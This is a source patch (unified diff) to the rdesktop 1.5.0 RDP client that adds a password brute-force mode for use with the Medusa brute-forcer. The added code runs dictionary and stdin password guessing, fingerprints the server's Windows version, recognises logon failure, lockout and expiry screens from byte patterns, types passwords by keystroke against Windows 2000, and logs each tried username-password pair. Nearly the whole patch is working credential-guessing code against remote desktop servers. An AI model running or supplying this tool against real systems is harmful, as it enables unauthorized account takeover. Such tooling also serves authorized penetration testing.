@@ -1,0 +1,792 @@
+Only in rdesktop-1.5.0: Makefile
+diff -urp rdesktop-1.5.0.orig/Makefile.in rdesktop-1.5.0/Makefile.in
+--- rdesktop-1.5.0.orig/Makefile.in	2006-04-10 02:27:50.000000000 +0800
++++ rdesktop-1.5.0/Makefile.in	2007-08-22 16:51:07.000000000 +0800
+@@ -57,7 +57,7 @@ install: installbin installkeymaps insta
+ installbin: rdesktop
+ 	mkdir -p $(DESTDIR)$(bindir)
+ 	$(INSTALL) rdesktop $(DESTDIR)$(bindir)
+-	$(STRIP) $(DESTDIR)$(bindir)/rdesktop
++	
+ 	chmod 755 $(DESTDIR)$(bindir)/rdesktop
+ 
+ .PHONY: installman
+Only in rdesktop-1.5.0: config.log
+Only in rdesktop-1.5.0: config.status
+diff -urp rdesktop-1.5.0.orig/configure rdesktop-1.5.0/configure
+--- rdesktop-1.5.0.orig/configure	2006-09-13 20:10:40.000000000 +0800
++++ rdesktop-1.5.0/configure	2007-08-22 16:51:07.000000000 +0800
+@@ -1986,13 +1986,13 @@ if test "$ac_test_CFLAGS" = set; then
+   CFLAGS=$ac_save_CFLAGS
+ elif test $ac_cv_prog_cc_g = yes; then
+   if test "$GCC" = yes; then
+-    CFLAGS="-g -O2"
++cflags="$cflags ${CFLAGS}"
+   else
+     CFLAGS="-g"
+   fi
+ else
+   if test "$GCC" = yes; then
+-    CFLAGS="-O2"
++cflags="$cflags ${CFLAGS}"
+   else
+     CFLAGS=
+   fi
+diff -urp rdesktop-1.5.0.orig/orders.c rdesktop-1.5.0/orders.c
+--- rdesktop-1.5.0.orig/orders.c	2006-08-07 19:45:43.000000000 +0800
++++ rdesktop-1.5.0/orders.c	2007-08-22 13:03:36.000000000 +0800
+@@ -21,10 +21,21 @@
+ #include "rdesktop.h"
+ #include "orders.h"
+ 
++
+ extern uint8 *g_next_packet;
+ static RDP_ORDER_STATE g_order_state;
+ extern BOOL g_use_rdp5;
+ 
++/* brute-force mode */
++#include <time.h>
++#include "scancodes.h"
++extern BOOL g_brute_complete;
++extern int g_brute_logon_status;
++extern int g_brute_mode;
++extern int g_server_version;
++extern int g_brute_w2k_send_logon;
++extern int g_w2k_auth_count;
++
+ /* Read field indicating which parameters are present */
+ static void
+ rdp_in_present(STREAM s, uint32 * present, uint8 flags, int size)
+@@ -863,6 +874,99 @@ process_text2(STREAM s, TEXT2_ORDER * os
+ 
+ 	DEBUG(("\n"));
+ 
++  /* Check text for failed logon message. This is a complete guess/hack... */
++  if (g_brute_mode != BRUTE_NONE)
++  {
++    if (!memcmp(os->text, LOGON_AUTH_FAILED, 3))
++    {
++      fprintf(stderr, "Retrieved connection termination packet.\n");
++      g_brute_complete = True;
++    }
++
++    if (g_server_version == VERSION_SRV_2K)
++    {
++      if (!memcmp(os->text, LOGON_W2K_BANNER, 23))
++      {
++        fprintf(stderr, "Retrieved Windows 2000 logon window.\n");
++        g_brute_w2k_send_logon = LOGIN_WIN_READY;
++      }
++    
++      /* if we see this message twice and we haven't seen "FE 00 00", we must have succeeded, right??? */
++      if (!memcmp(os->text, LOGON_W2K_MESSAGE, 4))
++      {
++        g_w2k_auth_count++;
++     
++        if ((!g_brute_complete) && (g_w2k_auth_count > 1))
++        {
++          fprintf(stderr, "Windows 2000 successful authentication.\n");
++          g_brute_logon_status = LOGIN_RESULT_SUCCESS;
++          g_brute_complete = True;
++        }
++      }
++      else if (g_brute_complete)
++      {
++        fprintf(stderr, "Windows 2000 authentication failed.\n");
++        if (g_brute_logon_status == LOGIN_RESULT_UNKNOWN) 
++          g_brute_logon_status = LOGIN_RESULT_FAIL;
++      }
++    }
++
++    if ((!memcmp(os->text, LOGON_MESSAGE_FAILED_XP, 18)) || (!memcmp(os->text, LOGON_MESSAGE_FAILED_2K3, 18)))
++    {
++      fprintf(stderr, "Account credentials are NOT valid.\n");
++      g_brute_logon_status = LOGIN_RESULT_FAIL;
++    }
++    else if ((!memcmp(os->text, LOGON_MESSAGE_NO_INTERACTIVE_XP, 18)) || (!memcmp(os->text, LOGON_MESSAGE_NO_INTERACTIVE_2K3, 18)))
++    {
++      fprintf(stderr, "Account credentials are valid, however, the account is denied interactive logon.\n");
++      g_brute_logon_status = LOGIN_RESULT_SUCCESS;
++    }
++    else if ((!memcmp(os->text, LOGON_MESSAGE_LOCKED_XP, 18)) || (!memcmp(os->text, LOGON_MESSAGE_LOCKED_2K3, 18)))
++    {
++      fprintf(stderr, "Account is currently locked out.\n");
++      g_brute_logon_status = LOGIN_RESULT_ERROR;
++    }
++    else if ((!memcmp(os->text, LOGON_MESSAGE_DISABLED_XP, 18)) || (!memcmp(os->text, LOGON_MESSAGE_DISABLED_2K3, 18))) 
++    {
++      fprintf(stderr, "Account is currently disabled or expired. XP appears to report that an account is disabled only for valid credentials.\n");
++      g_brute_logon_status = LOGIN_RESULT_ERROR;
++    }
++    else if ((!memcmp(os->text, LOGON_MESSAGE_EXPIRED_XP, 18)) || (!memcmp(os->text, LOGON_MESSAGE_EXPIRED_2K3, 18)) ||
++             (!memcmp(os->text, LOGON_MESSAGE_EXPIRED_W2K, 18)))
++    {
++      fprintf(stderr, "Account credentials are valid, however, the password has expired and must be changed.\n");
++      g_brute_logon_status = LOGIN_RESULT_SUCCESS;
++    }
++    else if ((!memcmp(os->text, LOGON_MESSAGE_MUST_CHANGE_XP, 18)) || (!memcmp(os->text, LOGON_MESSAGE_MUST_CHANGE_2K3, 18)))
++    {
++      fprintf(stderr, "Account credentials are valid, however, the password must be changed at first logon.\n");
++      g_brute_logon_status = LOGIN_RESULT_SUCCESS;
++    }
++    else if (!memcmp(os->text, LOGON_MESSAGE_MSTS_MAX_2K3, 18))
++    {
++      fprintf(stderr, "Account credentials are valid, however, the maximum number of terminal services connections has been reached.\n");
++      rdp_send_scancode( time(NULL), RDP_KEYPRESS, SCANCODE_CHAR_ESC );
++      rdp_send_scancode( time(NULL), RDP_KEYRELEASE, SCANCODE_CHAR_ESC );
++      g_brute_logon_status = LOGIN_RESULT_SUCCESS;
++    }
++    else if (!memcmp(os->text, LOGON_MESSAGE_CURRENT_USER_XP, 18))
++    {
++      fprintf(stderr, "Valid credentials, however, another user is currently logged on.\n");
++      /* Unable to ESC message about booting current user, so say NO. */
++      rdp_send_scancode( time(NULL), RDP_KEYPRESS, SCANCODE_CHAR_N );
++      rdp_send_scancode( time(NULL), RDP_KEYRELEASE, SCANCODE_CHAR_N );
++      g_brute_logon_status = LOGIN_RESULT_SUCCESS;
++      g_brute_complete = True;
++    }
++    else
++    {
++      DEBUG(("Logon failed with unknown text message: "));
++  	  for (i = 0; i < os->length; i++)
++	  	  DEBUG(("%02x ", os->text[i]));
++	    DEBUG(("\n"));
++    }
++  }
++
+ 	ui_draw_text(os->font, os->flags, os->opcode - 1, os->mixmode, os->x, os->y,
+ 		     os->clipleft, os->cliptop, os->clipright - os->clipleft,
+ 		     os->clipbottom - os->cliptop, os->boxleft, os->boxtop,
+diff -urp rdesktop-1.5.0.orig/orders.h rdesktop-1.5.0/orders.h
+--- rdesktop-1.5.0.orig/orders.h	2006-08-07 19:45:43.000000000 +0800
++++ rdesktop-1.5.0/orders.h	2007-08-22 13:03:36.000000000 +0800
+@@ -18,6 +18,52 @@
+    Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.
+ */
+ 
++/* brute-force code */
++
++/* The following is a complete guess... */
++
++/* This appears to indicate that our attempt has failed in some way */
++#define LOGON_AUTH_FAILED "\xfe\x00\x00"
++
++/* Windows 2000 logon banner */
++#define LOGON_W2K_BANNER  "\x1d\x00\x0c\x07\x1e\x07\x1f\x08\x20\x08\x21\x07\x1f\x06\x22\x08\x1f\x07\x1e\x08\x23\x08\x24"
++
++/* Using this string to track if we've successfully logged on */
++#define LOGON_W2K_MESSAGE "\x1f\x00\x26\x08"
++
++/* The system could not log you on. Make sure your User name and domain are correct [FAILED] */
++#define LOGON_MESSAGE_FAILED_XP  "\x17\x00\x18\x06\x10\x06\x1a\x09\x1b\x05\x1a\x06\x1c\x05\x10\x04\x1d\x06"
++#define LOGON_MESSAGE_FAILED_2K3 "\x11\x00\x12\x06\x13\x06\x15\x09\x16\x05\x15\x06\x17\x05\x13\x04\x18\x06"
++
++/* The local policy of this system does not permit you to logon interactively. [SUCCESS] */
++#define LOGON_MESSAGE_NO_INTERACTIVE_XP  "\x17\x00\x18\x06\x10\x06\x11\x09\x1a\x02\x0f\x06\x0d\x05\x11\x06\x1b\x05"
++#define LOGON_MESSAGE_NO_INTERACTIVE_2K3 "\x11\x00\x12\x06\x13\x06\x15\x09\x16\x02\x17\x06\x18\x05\x15\x06\x19\x05"
++
++/* Unable to log you on because your account has been locked out */
++#define LOGON_MESSAGE_LOCKED_XP  "\x17\x00\x0e\x07\x0d\x06\x18\x06\x11\x06\x10\x02\x1a\x09\x1b\x04\x11\x09"
++#define LOGON_MESSAGE_LOCKED_2K3 "\x11\x00\x12\x07\x13\x06\x14\x06\x15\x06\x16\x02\x18\x09\x19\x04\x15\x09"
++
++/* Your account has been disabled. Please see your system administrator. [ERROR] */
++/* Your account has expired. Please see your system administrator. [ERROR] */
++#define LOGON_MESSAGE_DISABLED_XP  "\x17\x00\x18\x06\x19\x06\x1a\x06\x0d\x07\x0f\x06\x0f\x05\x18\x05\x19\x06"
++#define LOGON_MESSAGE_DISABLED_2K3 "\x11\x00\x12\x06\x13\x06\x14\x06\x16\x07\x17\x06\x17\x05\x12\x05\x13\x06"
++
++/* Your password has expired and must be changed. [SUCCESS] */
++#define LOGON_MESSAGE_EXPIRED_XP  "\x17\x00\x18\x06\x19\x06\x0d\x09\x1b\x06\x10\x04\x1b\x09\x10\x04\x1c\x06"
++#define LOGON_MESSAGE_EXPIRED_2K3 "\x11\x00\x12\x06\x13\x06\x14\x06\x16\x07\x17\x06\x18\x06\x18\x05\x19\x05"
++#define LOGON_MESSAGE_EXPIRED_W2K "\x00\x00\x01\x06\x02\x07\x01\x07\x05\x07\x2d\x0a\x2e\x0a\x0b\x07\x0b\x06"
++
++/* You are required to change your password at first logon. [SUCCESS] */
++#define LOGON_MESSAGE_MUST_CHANGE_XP  "\x17\x00\x18\x06\x19\x06\x0d\x09\x1b\x06\x10\x04\x1b\x09\x10\x04\x1c\x06"
++#define LOGON_MESSAGE_MUST_CHANGE_2K3 "\x11\x00\x12\x06\x13\x06\x15\x09\x16\x06\x17\x04\x16\x09\x17\x04\x18\x06"
++
++/* The terminal server has exceeded the maximum number of allowed connections. [SUCCESS] */
++#define LOGON_MESSAGE_MSTS_MAX_2K3 "\x00\x00\x01\x06\x02\x07\x01\x07\x05\x07\x24\x0a\x25\x0a\x0b\x07\x0b\x06\x26"
++
++/* The user MACHINE_NAME\USER is currently logged on to this computer. [SUCCESS] */
++#define LOGON_MESSAGE_CURRENT_USER_XP "\x12\x00\x13\x07\x10\x05\x14\x06\x0e\x07\x0d\x06\x16\x06\x10\x08\x17\x06"
++/* end brute-force code */
++
+ #define RDP_ORDER_STANDARD   0x01
+ #define RDP_ORDER_SECONDARY  0x02
+ #define RDP_ORDER_BOUNDS     0x04
+diff -urp rdesktop-1.5.0.orig/rdesktop.c rdesktop-1.5.0/rdesktop.c
+--- rdesktop-1.5.0.orig/rdesktop.c	2006-08-07 19:45:43.000000000 +0800
++++ rdesktop-1.5.0/rdesktop.c	2007-08-22 16:51:07.000000000 +0800
+@@ -16,6 +16,16 @@
+    You should have received a copy of the GNU General Public License
+    along with this program; if not, write to the Free Software
+    Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.
++
++
++   2005-07-07 - Added dictionary support for automated login testing
++                patrik@cqure.net
++
++   2005-12-22 - Modified stdin password method to support Medusa wrapper
++                module (www.foofus.net/jmk/medusa/medusa.html). Also heavily
++                modified brute-force guessing to match various error messages
++                and kinda work against Windows 2000.
++                JoMo-Kun <jmk@foofus.net>
+ */
+ 
+ #include <stdarg.h>		/* va_list va_start va_end */
+@@ -47,6 +57,13 @@
+ 
+ #include <openssl/md5.h>
+ 
++int g_brute_mode = BRUTE_NONE;
++int g_brute_logon_status = LOGIN_RESULT_UNKNOWN;
++int g_server_version = VERSION_SRV_UNKNOWN;
++int g_brute_w2k_send_logon = LOGIN_WIN_UNKNOWN;
++int g_w2k_auth_count = 0;
++char *g_password = NULL;
++
+ char g_title[64] = "";
+ char g_username[64];
+ char g_hostname[16];
+@@ -103,6 +120,8 @@ char g_redirect_username[64];
+ char g_redirect_cookie[128];
+ uint32 g_redirect_flags = 0;
+ 
++FILE *g_logger = NULL;
++
+ #ifdef WITH_RDPSND
+ BOOL g_rdpsnd = False;
+ #endif
+@@ -114,6 +133,7 @@ char g_codepage[16] = "";
+ extern RDPDR_DEVICE g_rdpdr_device[];
+ extern uint32 g_num_devices;
+ extern char *g_rdpdr_clientname;
++extern BOOL g_loggedon;
+ 
+ #ifdef RDP2VNC
+ extern int rfb_port;
+@@ -128,6 +148,8 @@ usage(char *program)
+ {
+ 	fprintf(stderr, "rdesktop: A Remote Desktop Protocol client.\n");
+ 	fprintf(stderr, "Version " VERSION ". Copyright (C) 1999-2005 Matt Chapman.\n");
++	fprintf(stderr, "Password guess patch by patrik@cqure.net\n");
++	fprintf(stderr, "Modified by jmk@foofus.net for use with the brute-forcer Medusa.\n");
+ 	fprintf(stderr, "See http://www.rdesktop.org/ for more information.\n\n");
+ 
+ 	fprintf(stderr, "Usage: %s [options] server[:port]\n", program);
+@@ -139,7 +161,7 @@ usage(char *program)
+ 	fprintf(stderr, "   -d: domain\n");
+ 	fprintf(stderr, "   -s: shell\n");
+ 	fprintf(stderr, "   -c: working directory\n");
+-	fprintf(stderr, "   -p: password (- to prompt)\n");
++	fprintf(stderr, "   -p: password (- to prompt,filename for dictionary)\n");
+ 	fprintf(stderr, "   -n: client hostname\n");
+ 	fprintf(stderr, "   -k: keyboard layout on server (en-us, de, sv, etc.)\n");
+ 	fprintf(stderr, "   -g: desktop geometry (WxH)\n");
+@@ -191,6 +213,7 @@ usage(char *program)
+ 	fprintf(stderr, "   -0: attach to console\n");
+ 	fprintf(stderr, "   -4: use RDP version 4\n");
+ 	fprintf(stderr, "   -5: use RDP version 5 (default)\n");
++	fprintf(stderr, "   -l: logfile\n");
+ }
+ 
+ static void
+@@ -383,6 +406,41 @@ parse_server_and_port(char *server)
+ 
+ }
+ 
++void
++chomp( char *p )
++{
++	while( *p )
++	{
++		if (( '\r' == *p ) || ( '\n' == *p ) )
++			*p = 0;
++
++		*p++;
++	}
++}
++
++int
++logprintf( const char *format, ... )
++{
++	
++	va_list args;
++	int i;
++	
++	va_start( args, format );
++	
++	if ( g_logger ) {
++		i = vfprintf( g_logger, format, args );
++		vprintf( format, args );
++	}
++	else {
++		i = vprintf( format, args );
++	}
++	
++	va_end( args );
++	
++	return i;
++}
++
++
+ /* Client program */
+ int
+ main(int argc, char *argv[])
+@@ -393,11 +451,12 @@ main(int argc, char *argv[])
+ 	char password[64];
+ 	char shell[256];
+ 	char directory[256];
++	FILE *dicfile = NULL;
+ 	BOOL prompt_password, deactivated;
+ 	struct passwd *pw;
+ 	uint32 flags, ext_disc_reason = 0;
+ 	char *p;
+-	int c;
++	int c, i;
+ 	char *locale = NULL;
+ 	int username_option = 0;
+ 	BOOL geometry_option = False;
+@@ -427,7 +486,7 @@ main(int argc, char *argv[])
+ #endif
+ 
+ 	while ((c = getopt(argc, argv,
+-			   VNCOPT "Au:L:d:s:c:p:n:k:g:fbBeEmzCDKS:T:NX:a:x:Pr:045h?")) != -1)
++ 			   VNCOPT "Au:L:d:s:c:p:n:k:g:fbBeEmzCDKS:T:NX:a:x:Pr:045h?l:")) != -1)
+ 	{
+ 		switch (c)
+ 		{
+@@ -478,6 +537,13 @@ main(int argc, char *argv[])
+ 				if ((optarg[0] == '-') && (optarg[1] == 0))
+ 				{
+ 					prompt_password = True;
++					g_brute_mode = BRUTE_STDIN;
++          flags |= RDP_LOGON_AUTO;
++					break;
++				}
++				else if ( (dicfile = fopen( optarg, "r" ) ) ) {
++					g_brute_mode = BRUTE_FILE;
++          flags |= RDP_LOGON_AUTO;
+ 					break;
+ 				}
+ 
+@@ -746,6 +812,13 @@ main(int argc, char *argv[])
+ 			case '5':
+ 				g_use_rdp5 = True;
+ 				break;
++		        case 'l':
++				if ( NULL == ( g_logger = fopen( optarg, "w" ) ) )
++				{
++					fprintf(stderr, "Failed to open logfile (%s)\n", optarg);
++					return 1;
++				}    
++				break;
+ 
+ 			case 'h':
+ 			case '?':
+@@ -857,9 +930,6 @@ main(int argc, char *argv[])
+ 		xfree(locale);
+ 
+ 
+-	if (prompt_password && read_password(password, sizeof(password)))
+-		flags |= RDP_LOGON_AUTO;
+-
+ 	if (g_title[0] == 0)
+ 	{
+ 		strcpy(g_title, "rdesktop - ");
+@@ -886,6 +956,7 @@ main(int argc, char *argv[])
+ 
+ 	while (run_count < 2 && continue_connect)	/* add support for Session Directory; only reconnect once */
+ 	{
++		if (g_brute_mode == BRUTE_NONE){
+ 		if (run_count == 0)
+ 		{
+ 			if (!rdp_connect(server, flags, domain, password, shell, directory))
+@@ -894,25 +965,165 @@ main(int argc, char *argv[])
+ 		else if (!rdp_reconnect
+ 			 (server, flags, domain, password, shell, directory, g_redirect_cookie))
+ 			return 1;
++		} /*IF BRUTE end */
+ 
+ 		/* By setting encryption to False here, we have an encrypted login 
+ 		   packet but unencrypted transfer of other packets */
+ 		if (!packet_encryption)
+ 			g_encryption = False;
+ 
+-
++ 	if (g_brute_mode == BRUTE_NONE) 
++ 	{
+ 		DEBUG(("Connection successful.\n"));
+ 		memset(password, 0, sizeof(password));
++	}
+ 
+ 		if (run_count == 0)
+ 			if (!ui_create_window())
+ 				continue_connect = False;
+ 
+-		if (continue_connect)
++		if (continue_connect){
++ 		if ((g_brute_mode == BRUTE_FILE) && (dicfile)) {
++ 			logprintf("\nStarting dictionary attack against server %s\n", server);
++ 			logprintf("------------------------------------------");
++ 
++ 			for ( i=0; i<strlen(server); i++ )
++ 				logprintf("-");
++ 
++ 			logprintf("\n");
++ 			
++ 			while ( ( !g_loggedon ) && ( fgets( password, sizeof( password ) - 1, dicfile ) ) ) {
++ 				chomp( password );
++ 
++ 				g_encryption = True;
++ 
++         int sleep_count = 0;
++ 				while (!rdp_connect(server, flags, domain, password, shell, directory))
++         {
++           /* rdesktop seems to flake out after brute-forcing a bit. let's try again... */
++           fprintf(stderr, "Server appears to be flaking out. Sleeping (%d) seconds...\n", sleep_count);
++           sleep(sleep_count);
++           sleep_count += 5;
++ 
++           if (sleep_count > 15)
++           {
++             fprintf(stderr, "This shit is broke, I'm bailing...\n");
++             return 1;
++           }
++         }
++ 
++         if (g_server_version == VERSION_SRV_2K)
++         {
++           fprintf(stderr, "Server appears to be Windows 2000, brute-force guessing kinda works...\n");
++           g_brute_w2k_send_logon = LOGIN_WIN_UNKNOWN;
++           g_w2k_auth_count = 0;
++           g_password = password;
++         }
++ 
++ 				if (!packet_encryption)
++ 					g_encryption = False;
++ 
+ 			rdp_main_loop(&deactivated, &ext_disc_reason);
++ 				rdp_disconnect();
++ 
++         switch (g_brute_logon_status)
++         {
++           case LOGIN_RESULT_SUCCESS:
++ 					  logprintf("[success] User \"%s\" Password \"%s\"\n", g_username, password );
++             break;
++           case LOGIN_RESULT_FAIL:
++  					  logprintf( "[failure] User \"%s\" Password \"%s\"\n", g_username, password );
++             break;
++           case LOGIN_RESULT_ERROR:
++  					  logprintf( "[error] User \"%s\" Password \"%s\"\n", g_username, password );
++             return 1;
++             break;
++           default:
++  					  logprintf( "[error] User \"%s\" Password \"%s\". Connection terminated due to unknown error.\n", g_username, password );
++             return 1;
++             break;
++         }
++       }
++ 		}
++     else if (g_brute_mode == BRUTE_STDIN)
++     {
++       fprintf(stderr, "Starting brute-force attack via STDIN against %s\n", server);
++ 
++       while(!g_loggedon)
++       {
++         read_password(password, sizeof(password));
++ 
++         g_encryption = True;
++ 
++         int sleep_count = 0;
++ 				while (!rdp_connect(server, flags, domain, password, shell, directory))
++         {
++           /* rdesktop seems to flake out after brute-forcing a bit. let's try again... */
++           fprintf(stderr, "Server appears to be flaking out. Sleeping (%d) seconds...\n", sleep_count);
++           sleep(sleep_count);
++           sleep_count += 5;
++ 
++           if (sleep_count > 15)
++           {
++             fprintf(stderr, "This shit is broke, I'm bailing...\n");
++             fprintf(stderr, "LOGIN_RESULT_ERROR:Server stopped responding.\n");
++             return 1;
++           }
++         }
++         
++         if (g_server_version == VERSION_SRV_2K)
++         {
++           fprintf(stderr, "Server appears to be Windows 2000, brute-force guessing kinda works...\n");
++           g_brute_w2k_send_logon = LOGIN_WIN_UNKNOWN;
++           g_w2k_auth_count = 0;
++           g_password = password;
++         }
++ 
++         if (!packet_encryption)
++           g_encryption = False;
++ 
++         rdp_main_loop(&deactivated, &ext_disc_reason);        
++         rdp_disconnect();
++ 
++         switch (g_brute_logon_status)
++         {
++           case LOGIN_RESULT_SUCCESS:
++             fprintf(stderr, "LOGIN_RESULT_SUCCESS\n");
++             break;
++           case LOGIN_RESULT_FAIL:
++             fprintf(stderr, "LOGIN_RESULT_FAILURE\n");
++             break;
++           case LOGIN_RESULT_ERROR:
++             fprintf(stderr, "LOGIN_RESULT_ERROR\n");
++             return 1;
++             break;
++           default:
++             fprintf(stderr, "LOGIN_RESULT_ERROR:Connection terminated due to unknown error.\n");
++             return 1;
++             break;
++         }
++       }
++     }
++ 		else
++     {
++ 		  rdp_main_loop(&deactivated, &ext_disc_reason);
++ 		}
++ 
++
+ 
++		} /* continue connect */
++
++
++ 	if (g_brute_mode == BRUTE_NONE) {
+ 		DEBUG(("Disconnecting...\n"));
+ 		rdp_disconnect();
++ 	}
++ 	else
++   {
++     if (g_logger)
++ 		  fclose( g_logger );
++   }
++   
+ 
+ 		if ((g_redirect == True) && (run_count == 0))	/* Support for Session Directory */
+ 		{
+@@ -1366,7 +1577,6 @@ subprocess(char *const argv[], str_handl
+ 	return True;
+ }
+ 
+-
+ /* not all clibs got ltoa */
+ #define LTOA_BUFSIZE (sizeof(long) * 8 + 1)
+ 
+diff -urp rdesktop-1.5.0.orig/rdesktop.h rdesktop-1.5.0/rdesktop.h
+--- rdesktop-1.5.0.orig/rdesktop.h	2006-09-13 20:09:14.000000000 +0800
++++ rdesktop-1.5.0/rdesktop.h	2007-08-22 13:03:36.000000000 +0800
+@@ -33,6 +33,20 @@
+ 
+ #define VERSION "1.5.0"
+ 
++#define BRUTE_NONE 1
++#define BRUTE_STDIN 2
++#define BRUTE_FILE 3
++#define VERSION_SRV_UNKNOWN 0
++#define VERSION_SRV_XP2K3 1
++#define VERSION_SRV_2K 2
++#define LOGIN_RESULT_UNKNOWN 1
++#define LOGIN_RESULT_SUCCESS 2
++#define LOGIN_RESULT_FAIL 3
++#define LOGIN_RESULT_ERROR 4
++#define LOGIN_WIN_UNKNOWN 0
++#define LOGIN_WIN_PROC 1
++#define LOGIN_WIN_READY 2
++
+ #ifdef WITH_DEBUG
+ #define DEBUG(args)	printf args;
+ #else
+diff -urp rdesktop-1.5.0.orig/rdp.c rdesktop-1.5.0/rdp.c
+--- rdesktop-1.5.0.orig/rdp.c	2006-08-07 19:45:43.000000000 +0800
++++ rdesktop-1.5.0/rdp.c	2007-08-22 13:03:36.000000000 +0800
+@@ -16,12 +16,16 @@
+    You should have received a copy of the GNU General Public License
+    along with this program; if not, write to the Free Software
+    Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.
++
++   2005-07-07 Addedd support for detecting failed/successful login attempts
++
+ */
+ 
+ #include <time.h>
+ #include <errno.h>
+ #include <unistd.h>
+ #include "rdesktop.h"
++#include "scancodes.h"
+ 
+ #ifdef HAVE_ICONV
+ #ifdef HAVE_ICONV_H
+@@ -74,6 +78,20 @@ static uint32 g_packetno;
+ static BOOL g_iconv_works = True;
+ #endif
+ 
++/* brute-force stuff */
++extern int g_brute_mode;
++extern int g_server_version;
++extern int g_brute_logon_status;
++extern char* g_password;
++extern BOOL g_brute_w2k_send_logon;
++BOOL g_loggedon = False;
++BOOL g_brute_complete = False;
++#define KEYMAP_MASK 0xffff
++#define KEYMAP_SIZE 0xffff+1
++extern key_translation keymap[KEYMAP_SIZE];
++/* end brute-force */
++
++
+ /* Receive an RDP packet */
+ static STREAM
+ rdp_recv(uint8 * type)
+@@ -1288,6 +1306,7 @@ process_data_pdu(STREAM s, uint32 * ext_
+ 
+ 		case RDP_DATA_PDU_LOGON:
+ 			DEBUG(("Received Logon PDU\n"));
++			g_loggedon = True;
+ 			/* User logged on */
+ 			break;
+ 
+@@ -1375,6 +1394,63 @@ rdp_loop(BOOL * deactivated, uint32 * ex
+ 
+ 	while (cont)
+ 	{
++    if (g_brute_mode != BRUTE_NONE)
++    {
++      if ( g_loggedon )
++      {
++        DEBUG(("Brute-force complete, successful authentication.\n"));
++        g_brute_logon_status = LOGIN_RESULT_SUCCESS;
++        disc = True;
++      }
++      else if ( g_brute_complete )
++      {
++        /* failed */
++        DEBUG(("Brute-force complete, terminating connection.\n"));
++        rdp_send_scancode( time(NULL), RDP_KEYPRESS, SCANCODE_CHAR_ESC );
++        rdp_send_scancode( time(NULL), RDP_KEYRELEASE, SCANCODE_CHAR_ESC );
++        g_brute_complete = False;
++       
++        /* w2k success */
++        if (g_server_version == VERSION_SRV_2K)
++          disc = True;
++      }
++    
++      if ((g_server_version == VERSION_SRV_2K) && (g_brute_w2k_send_logon == LOGIN_WIN_READY))
++      {
++        g_brute_w2k_send_logon = LOGIN_WIN_UNKNOWN;
++
++        DEBUG(("Sending password: %s\n", g_password));
++        int i;
++        char keysym;
++        uint8 scancode;
++        
++        /* TAB to username field to view text */
++        //for(i = 0; i < 5; i++)
++        //{ 
++        //  rdp_send_scancode( time(NULL), RDP_KEYPRESS, SCANCODE_CHAR_TAB );
++        //  rdp_send_scancode( time(NULL), RDP_KEYRELEASE, SCANCODE_CHAR_TAB );
++        //}
++        
++        for(i = 0; i < strlen(g_password); i++)
++        {
++          keysym = g_password[i];
++          scancode = keymap[keysym & KEYMAP_MASK].scancode;
++          DEBUG(("Sending CHAR: %c KEYSYM: 0x%x SCANCODE: 0x%x\n", keysym, (unsigned int) keysym, scancode));
++          
++          if (keymap[keysym & KEYMAP_MASK].modifiers == 0x0)
++            rdp_send_scancode( time(NULL), RDP_KEYRELEASE, SCANCODE_CHAR_LSHIFT);
++          else
++            rdp_send_scancode( time(NULL), RDP_KEYPRESS, SCANCODE_CHAR_LSHIFT);
++          
++          rdp_send_scancode( time(NULL), RDP_KEYPRESS, scancode );
++          rdp_send_scancode( time(NULL), RDP_KEYRELEASE, scancode );
++        }
++        rdp_send_scancode( time(NULL), RDP_KEYRELEASE, SCANCODE_CHAR_LSHIFT);
++        rdp_send_scancode( time(NULL), RDP_KEYPRESS, SCANCODE_CHAR_ENTER );
++        rdp_send_scancode( time(NULL), RDP_KEYRELEASE, SCANCODE_CHAR_ENTER );
++      }
++    }
++
+ 		s = rdp_recv(&type);
+ 		if (s == NULL)
+ 			return False;
+@@ -1396,6 +1472,15 @@ rdp_loop(BOOL * deactivated, uint32 * ex
+ 				break;
+ 			case 0:
+ 				break;
++			case 15:
++        /* Intermittent with W2K brute-forcing issue */
++				if (g_server_version == VERSION_SRV_2K)
++        {
++          DEBUG(("Brute-force connection to Windows 2000 is fubar'd.\n"));
++          g_brute_logon_status = LOGIN_RESULT_ERROR;
++				  disc = True;
++				}
++        break;
+ 			default:
+ 				unimpl("PDU %d\n", type);
+ 		}
+Only in rdesktop-1.5.0: rdp.c.orig
+diff -urp rdesktop-1.5.0.orig/secure.c rdesktop-1.5.0/secure.c
+--- rdesktop-1.5.0.orig/secure.c	2006-08-07 19:45:43.000000000 +0800
++++ rdesktop-1.5.0/secure.c	2007-08-22 13:03:36.000000000 +0800
+@@ -42,6 +42,8 @@ extern uint16 mcs_userid;
+ extern VCHANNEL g_channels[];
+ extern unsigned int g_num_channels;
+ 
++extern int g_server_version;
++
+ static int rc4_key_len;
+ static RC4_KEY rc4_decrypt_key;
+ static RC4_KEY rc4_encrypt_key;
+@@ -786,6 +788,33 @@ sec_process_srv_info(STREAM s)
+ 		g_use_rdp5 = 0;
+ 		g_server_depth = 8;
+ 	}
++
++  /*
++    Attempting to determine server OS version. It appears that the 21st
++    byte in the response is 0x02 for XP/2K3 and 0x01 for W2K. Don't know
++    what this byte actually represents, so this is a complete hack...
++    
++    -0010 02 0c ec 00 01 00 00 00 02 00 00 00 20 00 00 00 ............ ...
++    +0010 02 0c ec 00 02 00 00 00 02 00 00 00 20 00 00 00 ............ ...
++  */
++  
++  //int datalen = s->end - s->p;
++	//hexdump(s->p, datalen);
++  switch ( *(s->p + 18) )
++  {
++    case 0x01:
++	    DEBUG_RDP5(("Server version appears to be Windows 2000.\n"));
++      g_server_version = VERSION_SRV_2K;
++      break;
++    case 0x02:
++	    DEBUG_RDP5(("Server version appears to be Windows XP/2003.\n"));
++      g_server_version = VERSION_SRV_XP2K3;
++      break;
++    default:
++	    DEBUG_RDP5(("Server version unknown. Interesting data: %d.\n", *(s->p + 18)));
++      g_server_version = VERSION_SRV_UNKNOWN;
++      break;
++  }
+ }
+ 
+ 
+diff -urp rdesktop-1.5.0.orig/xkeymap.c rdesktop-1.5.0/xkeymap.c
+--- rdesktop-1.5.0.orig/xkeymap.c	2006-08-07 19:45:44.000000000 +0800
++++ rdesktop-1.5.0/xkeymap.c	2007-08-22 16:48:57.000000000 +0800
+@@ -51,7 +51,8 @@ extern BOOL g_use_rdp5;
+ extern BOOL g_numlock_sync;
+ 
+ static BOOL keymap_loaded;
+-static key_translation *keymap[KEYMAP_SIZE];
++//static key_translation *keymap[KEYMAP_SIZE];
++key_translation *keymap[KEYMAP_SIZE];
